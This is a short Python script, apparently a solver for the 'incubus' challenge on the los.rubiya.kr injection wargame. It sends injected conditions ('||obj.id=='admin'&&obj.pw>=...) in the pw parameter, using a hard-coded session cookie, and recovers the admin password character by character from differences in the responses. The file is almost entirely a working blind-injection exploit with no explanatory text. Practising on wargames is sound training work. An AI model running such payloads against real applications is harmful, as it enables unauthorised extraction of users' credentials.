import requests
import string
import time

cnt=1
pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php"
cookies = {'PHPSESSID':'tq37qs365cufgcpm3p42i13pg6'}
for i in range(1,11):
    for j in a:
        pw_=pw
        pw_+=j
        url="https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php?id=&pw='||obj.id=='admin'%26%26obj.pw>='"+str(pw_)
        res = requests.get(url,cookies=cookies)
        res = res.text
        print(pw_)
        if "<br><h2>Hello admin" in res:
            temp=j
            pass
        else: 
            pw+=temp
            print("find")
            break

print(pw)